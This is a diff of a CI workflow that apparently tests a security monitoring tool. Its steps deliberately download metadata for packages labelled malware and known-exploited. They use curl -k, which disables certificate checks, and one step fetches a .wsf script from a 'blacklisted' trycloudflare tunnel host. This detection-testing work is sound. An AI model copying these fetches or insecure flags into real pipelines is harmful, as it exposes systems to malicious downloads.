@@ -69,6 +69,18 @@ jobs:
         continue-on-error: true
         run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/shiva123456-23.99.0-py2.py3-none-any.whl.metadata
 
+      - name: Install MALWARE package (Custom Builtins)
+        continue-on-error: true
+        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/yuzo-1.0.0-py2.py3-none-any.whl.metadata
+
+      - name: Install KEV package (Custom Builtins)
+        continue-on-error: true
+        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/langflow-base-0.0.50-py2.py3-none-any.whl.metadata
+        
+      - name: Install KEV package (Custom Builtins)
+        continue-on-error: true
+        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/salt-2015.8.0rc1-py2.py3-none-any.whl.metadata
+
       - name: Curl blacklisted host (Custom Builtins)
         run: curl https://ethical-points-competitive-fluid.trycloudflare.com/QFB3wsf/7/8/9/uju.wsf
 
@@ -154,6 +166,7 @@ jobs:
           app_token: ${{ secrets.IR_API_KEY_CB_STAGE }}
           send_job_status: "true"
           debug: "true"
+
 
 
 
